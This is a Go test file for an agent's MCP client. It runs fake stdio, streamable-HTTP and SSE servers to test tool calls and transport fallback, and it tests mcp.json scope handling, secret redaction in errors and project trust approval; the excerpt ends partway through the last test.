package mcp

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/EvilFreelancer/coddy-agent/internal/config"
)

// TestHelperMCPServer is not a real test: when re-executed with
// GO_WANT_MCP_HELPER=1 it becomes a minimal MCP stdio server speaking
// newline-delimited JSON-RPC with two tools (echo, reverse).
func TestHelperMCPServer(t *testing.T) {
	if os.Getenv("GO_WANT_MCP_HELPER") != "1" {
		t.Skip("helper process")
	}
	runFakeMCPServer()
	os.Exit(0)
}

func runFakeMCPServer() {
	in := bufio.NewReader(os.Stdin)
	out := bufio.NewWriter(os.Stdout)
	respond := func(id interface{}, result interface{}) {
		msg := map[string]interface{}{"jsonrpc": "2.0", "id": id, "result": result}
		data, _ := json.Marshal(msg)
		_, _ = out.Write(append(data, '\n'))
		_ = out.Flush()
	}
	for {
		line, err := in.ReadBytes('\n')
		if err != nil {
			return
		}
		var req struct {
			ID     interface{}     `json:"id"`
			Method string          `json:"method"`
			Params json.RawMessage `json:"params"`
		}
		if err := json.Unmarshal(line, &req); err != nil || req.ID == nil {
			continue // notification or garbage
		}
		switch req.Method {
		case "initialize":
			respond(req.ID, map[string]interface{}{
				"protocolVersion": "2024-11-05",
				"capabilities":    map[string]interface{}{},
				"serverInfo":      map[string]interface{}{"name": "fake-mcp", "version": "0.0.1"},
			})
		case "tools/list":
			schema := map[string]interface{}{
				"type":       "object",
				"properties": map[string]interface{}{"text": map[string]interface{}{"type": "string"}},
			}
			respond(req.ID, map[string]interface{}{"tools": []map[string]interface{}{
				{"name": "echo", "description": "Echo text back", "inputSchema": schema},
				{"name": "reverse", "description": "Reverse text", "inputSchema": schema},
			}})
		case "tools/call":
			var params struct {
				Name      string            `json:"name"`
				Arguments map[string]string `json:"arguments"`
			}
			_ = json.Unmarshal(req.Params, &params)
			text := params.Arguments["text"]
			if params.Name == "reverse" {
				r := []rune(text)
				for i, j := 0, len(r)-1; i < j; i, j = i+1, j-1 {
					r[i], r[j] = r[j], r[i]
				}
				text = string(r)
			}
			respond(req.ID, map[string]interface{}{
				"content": []map[string]interface{}{{"type": "text", "text": text}},
			})
		default:
			respond(req.ID, nil)
		}
	}
}

// fakeServerConfig returns an MCPServerConfig that re-executes this test
// binary as the fake MCP server above.
func fakeServerConfig(name string) config.MCPServerConfig {
	return config.MCPServerConfig{
		Name:    name,
		Command: os.Args[0],
		Args:    []string{"-test.run=TestHelperMCPServer"},
		Env:     []config.EnvVarConfig{{Name: "GO_WANT_MCP_HELPER", Value: "1"}},
	}
}

func testCtx(t *testing.T) context.Context {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	t.Cleanup(cancel)
	return ctx
}

func TestStdioClientAgainstFakeServer(t *testing.T) {
	srv := fakeServerConfig("fake")
	client, err := NewStdioClient(testCtx(t), srv.Name, srv.Command, srv.Args, []string{"GO_WANT_MCP_HELPER=1"}, slog.Default())
	if err != nil {
		t.Fatalf("NewStdioClient: %v", err)
	}
	defer func() { _ = client.Close() }()

	tools := client.Tools()
	if len(tools) != 2 || tools[0].Name != "echo" || tools[1].Name != "reverse" {
		t.Fatalf("tools = %+v, want echo+reverse", tools)
	}
	got, err := client.CallTool(testCtx(t), "reverse", `{"text":"abc"}`)
	if err != nil {
		t.Fatalf("CallTool: %v", err)
	}
	if got != "cba" {
		t.Fatalf("reverse = %q, want cba", got)
	}
}

func TestProbeListsTools(t *testing.T) {
	tools, err := Probe(testCtx(t), fakeServerConfig("fake"), t.TempDir(), slog.Default())
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if len(tools) != 2 {
		t.Fatalf("tools = %+v, want 2", tools)
	}
}

func TestProbeBadCommand(t *testing.T) {
	srv := config.MCPServerConfig{Name: "bad", Command: "/nonexistent-mcp-binary"}
	if _, err := Probe(testCtx(t), srv, t.TempDir(), slog.Default()); err == nil {
		t.Fatal("bad command must error")
	}
}

// ---- management operations ----

// writeTestConfig writes a config.yaml and loads it, pinning Paths.Home to
// the temp dir so the global <home>/mcp.json lands there too. config.yaml
// declares no MCP server: they live in the mcp.json files.
func writeTestConfig(t *testing.T) (*config.Config, string, string) {
	t.Helper()
	home := t.TempDir()
	cfgPath := home + "/config.yaml"
	yaml := `
agent:
  max_turns: 7
`
	if err := os.WriteFile(cfgPath, []byte(yaml), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(cfgPath)
	if err != nil {
		t.Fatalf("load config: %v", err)
	}
	cfg.Paths.Home = home
	return cfg, cfgPath, home
}

func TestListManagedServersScopesAndOrigins(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()
	globalPath := config.GlobalMCPJSONPath(home)
	projectPath := config.MCPJSONPath(cwd)

	// The global file declares home-srv and shared; the project file adds
	// proj-srv and overrides shared.
	for name, srv := range map[string]config.MCPJSONServer{
		"home-srv": {Command: "home-mcp"},
		"shared":   {Command: "home-shared"},
	} {
		if err := config.UpsertMCPJSONServer(globalPath, name, srv); err != nil {
			t.Fatal(err)
		}
	}
	for name, srv := range map[string]config.MCPJSONServer{
		"proj-srv": {Command: "proj-mcp"},
		"shared":   {Command: "proj-override"},
	} {
		if err := config.UpsertMCPJSONServer(projectPath, name, srv); err != nil {
			t.Fatal(err)
		}
	}

	servers, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatalf("ListManagedServers: %v", err)
	}
	if len(servers) != 3 {
		t.Fatalf("servers = %+v, want 3", servers)
	}
	type so struct{ scope, origin, command string }
	got := map[string]so{}
	for _, s := range servers {
		got[s.Config.Name] = so{s.Scope, s.Origin, s.Config.Command}
	}
	if got["home-srv"] != (so{ScopeGlobal, OriginHome, "home-mcp"}) {
		t.Errorf("home-srv = %+v, want global/home", got["home-srv"])
	}
	if got["shared"] != (so{ScopeLocal, OriginProject, "proj-override"}) {
		t.Errorf("shared = %+v, want local/project with the project override", got["shared"])
	}
	if got["proj-srv"] != (so{ScopeLocal, OriginProject, "proj-mcp"}) {
		t.Errorf("proj-srv = %+v, want local/project", got["proj-srv"])
	}

	// Without the project file the global declaration is the one listed.
	if err := os.Remove(projectPath); err != nil {
		t.Fatal(err)
	}
	servers, _ = ListManagedServers(cfg, cwd)
	if len(servers) != 2 {
		t.Fatalf("servers without the project file = %+v, want 2", servers)
	}
	for _, s := range servers {
		if s.Origin != OriginHome || s.Scope != ScopeGlobal {
			t.Errorf("%s = %s/%s, want global/home", s.Config.Name, s.Scope, s.Origin)
		}
	}
}

func TestSetServerDisabledPersistsToOwningFile(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()
	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "home-srv", config.MCPJSONServer{Command: "home-mcp"}); err != nil {
		t.Fatal(err)
	}
	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj-srv", config.MCPJSONServer{Command: "proj-mcp"}); err != nil {
		t.Fatal(err)
	}

	// Project-owned toggle stays in the operator's home, outside the checkout.
	if err := SetServerDisabled(cfg, cwd, "proj-srv", true); err != nil {
		t.Fatalf("disable project server: %v", err)
	}
	entries, _ := config.ReadMCPJSONFile(config.MCPJSONPath(cwd))
	if entries["proj-srv"].Disabled {
		t.Errorf("proj-srv declaration changed in project mcp.json: %+v", entries)
	}
	managed, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	for _, srv := range managed {
		if srv.Config.Name == "proj-srv" && !srv.Config.Disabled {
			t.Errorf("proj-srv switch not applied: %+v", srv.Config)
		}
	}

	// Home-owned toggle lands in <home>/mcp.json.
	if err := SetServerDisabled(cfg, cwd, "home-srv", true); err != nil {
		t.Fatalf("disable home server: %v", err)
	}
	entries, _ = config.ReadMCPJSONFile(config.GlobalMCPJSONPath(home))
	if !entries["home-srv"].Disabled {
		t.Errorf("home-srv not disabled in global mcp.json: %+v", entries)
	}

	if err := SetServerDisabled(cfg, cwd, "ghost", true); err == nil {
		t.Error("unknown server must error")
	}
}

func TestSetToolDisabledPersistsToOwningFile(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()
	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "home-srv", config.MCPJSONServer{Command: "home-mcp"}); err != nil {
		t.Fatal(err)
	}

	if err := SetToolDisabled(cfg, cwd, "home-srv", "echo", true); err != nil {
		t.Fatalf("disable home tool: %v", err)
	}
	entries, _ := config.ReadMCPJSONFile(config.GlobalMCPJSONPath(home))
	if got := entries["home-srv"].DisabledTools; len(got) != 1 || got[0] != "echo" {
		t.Errorf("home-srv disabledTools = %v, want [echo]", got)
	}

	// Re-enable removes the entry again.
	if err := SetToolDisabled(cfg, cwd, "home-srv", "echo", false); err != nil {
		t.Fatal(err)
	}
	entries, _ = config.ReadMCPJSONFile(config.GlobalMCPJSONPath(home))
	if got := entries["home-srv"].DisabledTools; len(got) != 0 {
		t.Errorf("home-srv disabledTools = %v, want empty", got)
	}
}

func TestSaveServerScopes(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()

	if err := SaveServer(cfg, cwd, "glob", ScopeGlobal, config.MCPJSONServer{Command: "glob-mcp"}, ""); err != nil {
		t.Fatalf("upsert global: %v", err)
	}
	entries, _ := config.ReadMCPJSONFile(config.GlobalMCPJSONPath(home))
	if entries["glob"].Command != "glob-mcp" {
		t.Errorf("global mcp.json = %+v, want glob", entries)
	}

	if err := SaveServer(cfg, cwd, "loc", ScopeLocal, config.MCPJSONServer{Command: "loc-mcp"}, ""); err != nil {
		t.Fatalf("upsert local: %v", err)
	}
	entries, _ = config.ReadMCPJSONFile(config.MCPJSONPath(cwd))
	if entries["loc"].Command != "loc-mcp" {
		t.Errorf("project mcp.json = %+v, want loc", entries)
	}

	if err := SaveServer(cfg, cwd, "x", "nope", config.MCPJSONServer{Command: "x"}, ""); err == nil {
		t.Error("unknown scope must error")
	}
}

// The list shows "<redacted>" in place of every env and header value, so a
// save of an edited entry sends it back for the values the operator did not
// retype: those keep what the file stores, typed values replace theirs, and
// a key left out goes. A check against the declaration shown and the write it
// allows read the file once; a refusal writes nothing.
func TestSaveServerKeepsRedactedValues(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()
	globalPath := config.GlobalMCPJSONPath(home)
	stored := config.MCPJSONServer{Command: "files-mcp", Env: map[string]string{"TOKEN": "tok-1", "OLD": "gone"}, Headers: map[string]string{"X-Key": "tok-2"}}
	if err := config.UpsertMCPJSONServer(globalPath, "files", stored); err != nil {
		t.Fatal(err)
	}
	shown := Fingerprint(config.MCPServerFromJSON("files", stored))
	unchanged := func(t *testing.T, path string, want []byte) {
		t.Helper()
		if got, _ := os.ReadFile(path); string(got) != string(want) {
			t.Fatalf("a refused save rewrote %s:\n%s", path, got)
		}
	}

	edit := config.MCPJSONServer{Command: "files-mcp", Env: map[string]string{"TOKEN": config.RedactedValue, "NEW": "fresh"}, Headers: map[string]string{"X-Key": config.RedactedValue}}
	if err := SaveServer(cfg, cwd, "files", ScopeGlobal, edit, shown); err != nil {
		t.Fatal(err)
	}
	entries, _ := config.ReadMCPJSONFile(globalPath)
	if got := entries["files"]; !reflect.DeepEqual(got.Env, map[string]string{"TOKEN": "tok-1", "NEW": "fresh"}) || !reflect.DeepEqual(got.Headers, map[string]string{"X-Key": "tok-2"}) {
		t.Fatalf("saved entry = %+v", got)
	}
	before, _ := os.ReadFile(globalPath)

	err := SaveServer(cfg, cwd, "files", ScopeGlobal, config.MCPJSONServer{Command: "files-mcp", Headers: map[string]string{"X-Missing": config.RedactedValue}}, "")
	if err == nil || !strings.Contains(err.Error(), "X-Missing") {
		t.Fatalf("a placeholder for a value the file lacks = %v, want an error naming it", err)
	}
	unchanged(t, globalPath, before)

	if err := SaveServer(cfg, cwd, "files", ScopeGlobal, edit, shown); !errors.Is(err, ErrDeclarationChanged) {
		t.Fatalf("a save against the declaration as it was before the last save = %v, want ErrDeclarationChanged", err)
	}
	unchanged(t, globalPath, before)
	if err := SaveServer(cfg, cwd, "gone", ScopeGlobal, config.MCPJSONServer{Command: "x"}, shown); !errors.Is(err, ErrDeclarationChanged) {
		t.Fatalf("a save naming a declaration deleted since = %v, want ErrDeclarationChanged", err)
	}
	unchanged(t, globalPath, before)

	// A project entry keeps a value only against the declaration shown, and
	// the save approves what it wrote.
	projectPath := config.MCPJSONPath(cwd)
	project := config.MCPJSONServer{Command: "tracker-mcp", Env: map[string]string{"KEY": "tok-3", "MODE": "${TRACKER_MODE}"}}
	if err := config.UpsertMCPJSONServer(projectPath, "tracker", project); err != nil {
		t.Fatal(err)
	}
	keep := config.MCPJSONServer{Command: "tracker-mcp", Args: []string{"--verbose"}, Env: map[string]string{"KEY": config.RedactedValue, "MODE": config.RedactedValue}}
	projectBefore, _ := os.ReadFile(projectPath)
	if err := SaveServer(cfg, cwd, "tracker", ScopeLocal, keep, ""); err == nil || !strings.Contains(err.Error(), "fingerprint") {
		t.Fatalf("keeping a project value without the fingerprint = %v, want a refusal naming it", err)
	}
	unchanged(t, projectPath, projectBefore)
	if err := SaveServer(cfg, cwd, "tracker", ScopeLocal, keep, Fingerprint(config.MCPServerFromJSON("tracker", project))); err != nil {
		t.Fatal(err)
	}
	servers, err := ListManagedServers(cfg, cwd)
	if err != nil {
		t.Fatal(err)
	}
	for _, srv := range servers {
		if srv.Config.Name != "tracker" {
			continue
		}
		if got := srv.Config.Env; len(got) != 2 || got[0].Value != "tok-3" || got[1].Value != "${TRACKER_MODE}" {
			t.Fatalf("kept project values = %+v", got)
		}
		if state := NewTrustGate(cfg).Evaluate(cwd, srv); state != TrustStateAllowed {
			t.Fatalf("the saved project entry is %s, want it approved as written", state)
		}
	}

	// Typed whole, a project entry needs no fingerprint.
	if err := SaveServer(cfg, cwd, "typed", ScopeLocal, config.MCPJSONServer{Command: "typed-mcp", Env: map[string]string{"KEY": "typed"}}, ""); err != nil {
		t.Fatalf("a project entry typed whole = %v", err)
	}
}

// Under mcp.project_trust allow a project entry starts without an approval,
// so a save of one records no receipt.
func TestSaveServerUnderAllowRecordsNoReceipt(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()
	cfg.MCP.ProjectTrust = config.ProjectTrustAllow
	if err := SaveServer(cfg, cwd, "free", ScopeLocal, config.MCPJSONServer{Command: "free-mcp"}, ""); err != nil {
		t.Fatal(err)
	}
	if recs := NewTrustStore(home).Records(cwd); len(recs) != 0 {
		t.Fatalf("a save under allow recorded receipts: %+v", recs)
	}
}

// A probe error shown next to a server carries what the declaration resolved
// to - the request URL with a ${NAME} in its query, a credential the server
// echoed back - and leaves the server the way the list shows the declaration.
func TestRedactValues(t *testing.T) {
	t.Setenv("XR_REDACT_KEY", "tok-url-s3cr3t")
	t.Setenv("XR_REDACT_PATH", "a/b+c=d/tok-path")
	srv := config.MCPServerConfig{
		Name:    "docs",
		URL:     "https://mcp.example/${XR_REDACT_PATH}?api_key=${XR_REDACT_KEY}",
		Env:     []config.EnvVarConfig{{Name: "TOKEN", Value: "tok-env-literal"}, {Name: "DEBUG", Value: "1"}},
		Headers: []config.HTTPHeaderConfig{{Name: "Authorization", Value: "Bearer tok-hdr-s3cr3t"}, {Name: "X-Key", Value: "${XR_REDACT_KEY}"}},
	}
	cases := []struct{ name, msg, want string }{
		{"transport error prints the request URL",
			`Post "https://mcp.example/a/b+c=d/tok-path?api_key=tok-url-s3cr3t": dial tcp: connection refused`,
			`Post "https://mcp.example/${XR_REDACT_PATH}?api_key=${XR_REDACT_KEY}": dial tcp: connection refused`},
		{"a refusal echoes the token of a header",
			`sse connect: http 401 text/plain: invalid token tok-hdr-s3cr3t`,
			`sse connect: http 401 text/plain: invalid token <redacted>`},
		{"a server echoes an env value",
			`jsonrpc error -32000: TOKEN=tok-env-literal rejected`,
			`jsonrpc error -32000: TOKEN=<redacted> rejected`},
		{"a variable escaped into a path",
			`GET /x/` + url.PathEscape("a/b+c=d/tok-path") + `: not found`,
			`GET /x/<redacted>: not found`},
		{"short values are ordinary words",
			`exit status 1`, `exit status 1`},
		{"nothing to redact", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := RedactValues(srv, t.TempDir(), tc.msg); got != tc.want {
				t.Fatalf("RedactValues = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestDeleteServerPerOrigin(t *testing.T) {
	cfg, _, home := writeTestConfig(t)
	cwd := t.TempDir()
	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "home-srv", config.MCPJSONServer{Command: "home-mcp"}); err != nil {
		t.Fatal(err)
	}
	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj-srv", config.MCPJSONServer{Command: "proj-mcp"}); err != nil {
		t.Fatal(err)
	}

	if err := DeleteServer(cfg, cwd, "proj-srv"); err != nil {
		t.Fatalf("delete project server: %v", err)
	}
	if err := DeleteServer(cfg, cwd, "home-srv"); err != nil {
		t.Fatalf("delete home server: %v", err)
	}
	entries, _ := config.ReadMCPJSONFile(config.GlobalMCPJSONPath(home))
	if _, ok := entries["home-srv"]; ok {
		t.Errorf("home-srv still present: %+v", entries)
	}

	if err := DeleteServer(cfg, cwd, "ghost"); err == nil {
		t.Error("unknown server must error")
	}
}

func TestValidateServerName(t *testing.T) {
	for _, ok := range []string{"files", "my-server", "srv1"} {
		if err := ValidateServerName(ok); err != nil {
			t.Errorf("ValidateServerName(%q) = %v, want nil", ok, err)
		}
	}
	// "__" is the tool-namespace separator; spaces and separators break lookups.
	for _, bad := range []string{"", "a__b", "a b", "a/b", "a\\b", "  "} {
		if err := ValidateServerName(bad); err == nil {
			t.Errorf("ValidateServerName(%q) = nil, want error", bad)
		}
	}
}

// ---- remote transports (streamable HTTP and legacy SSE) ----

// fakeStreamableHandler implements a minimal MCP streamable HTTP server: one
// POST endpoint accepting JSON-RPC, answering initialize/tools/list/tools/call
// with application/json bodies (or an SSE body when sseResults is set),
// issuing an Mcp-Session-Id on initialize and requiring it on every later
// request (notifications included). With auth set, every request must carry
// the X-Auth header. The special tool names rpcfail / toolfail exercise the
// JSON-RPC-error and isError result paths.
type fakeStreamableHandler struct {
	sseResults bool
	auth       string
	calls      atomic.Int64
}

func (h *fakeStreamableHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	if h.auth != "" && r.Header.Get("X-Auth") != h.auth {
		http.Error(w, "missing auth header", http.StatusUnauthorized)
		return
	}
	body, _ := io.ReadAll(r.Body)
	var req struct {
		ID     interface{}     `json:"id"`
		Method string          `json:"method"`
		Params json.RawMessage `json:"params"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	if req.Method != "initialize" && r.Header.Get("Mcp-Session-Id") != "sess-123" {
		http.Error(w, "missing session id", http.StatusBadRequest)
		return
	}
	if req.ID == nil { // notification
		w.WriteHeader(http.StatusAccepted)
		return
	}
	respond := func(result interface{}) {
		msg, _ := json.Marshal(map[string]interface{}{"jsonrpc": "2.0", "id": req.ID, "result": result})
		if h.sseResults {
			w.Header().Set("Content-Type", "text/event-stream")
			_, _ = fmt.Fprintf(w, "event: message\ndata: %s\n\n", msg)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(msg)
	}
	switch req.Method {
	case "initialize":
		w.Header().Set("Mcp-Session-Id", "sess-123")
		respond(map[string]interface{}{
			"protocolVersion": "2025-03-26",
			"capabilities":    map[string]interface{}{},
			"serverInfo":      map[string]interface{}{"name": "fake-streamable", "version": "0.0.1"},
		})
	case "tools/list":
		respond(map[string]interface{}{"tools": []map[string]interface{}{{
			"name":        "remote_echo",
			"description": "Echo over streamable http",
			"inputSchema": map[string]interface{}{"type": "object"},
		}}})
	case "tools/call":
		h.calls.Add(1)
		var params struct {
			Name      string            `json:"name"`
			Arguments map[string]string `json:"arguments"`
		}
		_ = json.Unmarshal(req.Params, &params)
		switch params.Name {
		case "rpcfail":
			msg, _ := json.Marshal(map[string]interface{}{
				"jsonrpc": "2.0", "id": req.ID,
				"error": map[string]interface{}{"code": -32602, "message": "invalid params"},
			})
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write(msg)
		case "toolfail":
			respond(map[string]interface{}{
				"content": []map[string]interface{}{{"type": "text", "text": "tool blew up"}},
				"isError": true,
			})
		default:
			respond(map[string]interface{}{
				"content": []map[string]interface{}{{"type": "text", "text": "remote:" + params.Arguments["text"]}},
			})
		}
	default:
		respond(nil)
	}
}

func TestStreamableHTTPClient(t *testing.T) {
	// auth makes the fake reject any request missing the configured header,
	// so this also proves headers are sent on every message.
	h := &fakeStreamableHandler{auth: "tok"}
	ts := httptest.NewServer(h)
	defer ts.Close()

	client, err := NewHTTPClient(testCtx(t), "remote", ts.URL, map[string]string{"X-Auth": "tok"}, slog.Default())
	if err != nil {
		t.Fatalf("NewHTTPClient: %v", err)
	}
	defer func() { _ = client.Close() }()

	tools := client.Tools()
	if len(tools) != 1 || tools[0].Name != "remote_echo" {
		t.Fatalf("tools = %+v, want remote_echo", tools)
	}
	got, err := client.CallTool(testCtx(t), "remote_echo", `{"text":"hi"}`)
	if err != nil {
		t.Fatalf("CallTool: %v", err)
	}
	if got != "remote:hi" {
		t.Fatalf("result = %q, want remote:hi", got)
	}
	if h.calls.Load() != 1 {
		t.Fatalf("server saw %d tool calls, want 1", h.calls.Load())
	}

	// JSON-RPC error responses surface as errors, not silent empty results.
	if _, err := client.CallTool(testCtx(t), "rpcfail", `{}`); err == nil || !strings.Contains(err.Error(), "jsonrpc error -32602") {
		t.Fatalf("rpcfail err = %v, want jsonrpc error -32602", err)
	}
	// isError tool results surface as errors too.
	if _, err := client.CallTool(testCtx(t), "toolfail", `{}`); err == nil || !strings.Contains(err.Error(), "tool blew up") {
		t.Fatalf("toolfail err = %v, want mcp tool error", err)
	}
}

func TestStdioClientSurvivesConnectCtxCancel(t *testing.T) {
	// The connect ctx bounds only the handshake: HTTP-created sessions pass a
	// request-scoped ctx here, and the subprocess must outlive it or every
	// turn after the first would hit a dead server.
	connectCtx, cancel := context.WithCancel(context.Background())
	srv := fakeServerConfig("fake")
	client, err := NewStdioClient(connectCtx, srv.Name, srv.Command, srv.Args, []string{"GO_WANT_MCP_HELPER=1"}, slog.Default())
	if err != nil {
		t.Fatalf("NewStdioClient: %v", err)
	}
	defer func() { _ = client.Close() }()

	cancel()
	time.Sleep(100 * time.Millisecond) // give a ctx-tied process time to die

	got, err := client.CallTool(testCtx(t), "echo", `{"text":"still-alive"}`)
	if err != nil {
		t.Fatalf("CallTool after connect ctx cancel: %v", err)
	}
	if got != "still-alive" {
		t.Fatalf("result = %q, want still-alive", got)
	}
}

func TestStreamableHTTPClientSSEResponses(t *testing.T) {
	ts := httptest.NewServer(&fakeStreamableHandler{sseResults: true})
	defer ts.Close()

	client, err := NewHTTPClient(testCtx(t), "remote", ts.URL, nil, slog.Default())
	if err != nil {
		t.Fatalf("NewHTTPClient (sse bodies): %v", err)
	}
	defer func() { _ = client.Close() }()
	got, err := client.CallTool(testCtx(t), "remote_echo", `{"text":"sse"}`)
	if err != nil || got != "remote:sse" {
		t.Fatalf("CallTool = %q, %v; want remote:sse", got, err)
	}
}

// fakeLegacySSEServer implements the 2024-11-05 HTTP+SSE transport: GET opens
// an event stream that first announces the POST endpoint, then carries every
// JSON-RPC response; POSTs to the endpoint return 202.
func newFakeLegacySSEServer(t *testing.T) *httptest.Server {
	t.Helper()
	type sseSession struct{ out chan []byte }
	sessions := struct {
		sync.Mutex
		m map[string]*sseSession
	}{m: map[string]*sseSession{}}

	mux := http.NewServeMux()
	mux.HandleFunc("GET /sse", func(w http.ResponseWriter, r *http.Request) {
		fl, ok := w.(http.Flusher)
		if !ok {
			t.Error("no flusher")
			return
		}
		sess := &sseSession{out: make(chan []byte, 16)}
		sessions.Lock()
		sessions.m["s1"] = sess
		sessions.Unlock()
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = fmt.Fprintf(w, "event: endpoint\ndata: /messages?session=s1\n\n")
		fl.Flush()
		for {
			select {
			case msg := <-sess.out:
				_, _ = fmt.Fprintf(w, "event: message\ndata: %s\n\n", msg)
				fl.Flush()
			case <-r.Context().Done():
				return
			}
		}
	})
	mux.HandleFunc("POST /messages", func(w http.ResponseWriter, r *http.Request) {
		// The endpoint event announced /messages?session=s1: reject POSTs
		// that dropped the query so the client's endpoint resolution is real.
		if r.URL.Query().Get("session") != "s1" {
			http.Error(w, "missing session query", http.StatusBadRequest)
			return
		}
		body, _ := io.ReadAll(r.Body)
		var req struct {
			ID     interface{}     `json:"id"`
			Method string          `json:"method"`
			Params json.RawMessage `json:"params"`
		}
		_ = json.Unmarshal(body, &req)
		w.WriteHeader(http.StatusAccepted)
		if req.ID == nil {
			return
		}
		sessions.Lock()
		sess := sessions.m["s1"]
		sessions.Unlock()
		respond := func(result interface{}) {
			msg, _ := json.Marshal(map[string]interface{}{"jsonrpc": "2.0", "id": req.ID, "result": result})
			sess.out <- msg
		}
		switch req.Method {
		case "initialize":
			respond(map[string]interface{}{
				"protocolVersion": "2024-11-05",
				"capabilities":    map[string]interface{}{},
				"serverInfo":      map[string]interface{}{"name": "fake-sse", "version": "0.0.1"},
			})
		case "tools/list":
			respond(map[string]interface{}{"tools": []map[string]interface{}{{
				"name":        "sse_echo",
				"description": "Echo over legacy SSE",
				"inputSchema": map[string]interface{}{"type": "object"},
			}}})
		case "tools/call":
			var params struct {
				Arguments map[string]string `json:"arguments"`
			}
			_ = json.Unmarshal(req.Params, &params)
			respond(map[string]interface{}{
				"content": []map[string]interface{}{{"type": "text", "text": "sse:" + params.Arguments["text"]}},
			})
		default:
			respond(nil)
		}
	})
	return httptest.NewServer(mux)
}

func TestLegacySSEClient(t *testing.T) {
	ts := newFakeLegacySSEServer(t)
	defer ts.Close()

	client, err := NewSSEClient(testCtx(t), "legacy", ts.URL+"/sse", nil, slog.Default())
	if err != nil {
		t.Fatalf("NewSSEClient: %v", err)
	}
	defer func() { _ = client.Close() }()
	tools := client.Tools()
	if len(tools) != 1 || tools[0].Name != "sse_echo" {
		t.Fatalf("tools = %+v, want sse_echo", tools)
	}
	got, err := client.CallTool(testCtx(t), "sse_echo", `{"text":"x"}`)
	if err != nil || got != "sse:x" {
		t.Fatalf("CallTool = %q, %v; want sse:x", got, err)
	}
}

func TestHTTPClientFallsBackToSSE(t *testing.T) {
	// A server that only speaks the legacy protocol: POST to the SSE URL is
	// rejected, so the streamable attempt fails and the client retries as SSE.
	ts := newFakeLegacySSEServer(t)
	defer ts.Close()

	client, err := NewHTTPClient(testCtx(t), "legacy", ts.URL+"/sse", nil, slog.Default())
	if err != nil {
		t.Fatalf("NewHTTPClient with legacy server: %v", err)
	}
	defer func() { _ = client.Close() }()
	if tools := client.Tools(); len(tools) != 1 || tools[0].Name != "sse_echo" {
		t.Fatalf("tools = %+v, want sse_echo via fallback", tools)
	}
}

func TestConnectDispatchesByType(t *testing.T) {
	streamable := httptest.NewServer(&fakeStreamableHandler{auth: "tok"})
	defer streamable.Close()

	// stdio (default type) still works through Connect.
	stdioClient, err := Connect(testCtx(t), fakeServerConfig("fake"), t.TempDir(), slog.Default())
	if err != nil {
		t.Fatalf("Connect stdio: %v", err)
	}
	defer func() { _ = stdioClient.Close() }()
	if len(stdioClient.Tools()) != 2 {
		t.Fatalf("stdio tools = %+v", stdioClient.Tools())
	}

	httpClient, err := Connect(testCtx(t), config.MCPServerConfig{
		Name: "remote", Type: "http", URL: streamable.URL,
		Headers: []config.HTTPHeaderConfig{{Name: "X-Auth", Value: "tok"}},
	}, t.TempDir(), slog.Default())
	if err != nil {
		t.Fatalf("Connect http: %v", err)
	}
	defer func() { _ = httpClient.Close() }()
	if len(httpClient.Tools()) != 1 {
		t.Fatalf("http tools = %+v", httpClient.Tools())
	}

	// The streamable-http alias reaches the same transport.
	aliasClient, err := Connect(testCtx(t), config.MCPServerConfig{
		Name: "alias", Type: "streamable-http", URL: streamable.URL,
		Headers: []config.HTTPHeaderConfig{{Name: "X-Auth", Value: "tok"}},
	}, t.TempDir(), slog.Default())
	if err != nil {
		t.Fatalf("Connect streamable-http alias: %v", err)
	}
	defer func() { _ = aliasClient.Close() }()

	// Explicit type sse forces the legacy transport (no fallback involved).
	legacy := newFakeLegacySSEServer(t)
	defer legacy.Close()
	sseClient, err := Connect(testCtx(t), config.MCPServerConfig{
		Name: "legacy", Type: "sse", URL: legacy.URL + "/sse",
	}, t.TempDir(), slog.Default())
	if err != nil {
		t.Fatalf("Connect sse: %v", err)
	}
	defer func() { _ = sseClient.Close() }()
	if tools := sseClient.Tools(); len(tools) != 1 || tools[0].Name != "sse_echo" {
		t.Fatalf("sse tools = %+v", tools)
	}

	if _, err := Connect(testCtx(t), config.MCPServerConfig{Name: "x", Type: "websocket"}, t.TempDir(), slog.Default()); err == nil {
		t.Fatal("unknown transport must error")
	}
}

func TestSSEConnectHonorsCtxOnSilentServer(t *testing.T) {
	// A server that accepts the connection but never sends response headers
	// must not hang Connect/probe past the caller's deadline.
	silent := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		<-r.Context().Done()
	}))
	defer silent.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()
	start := time.Now()
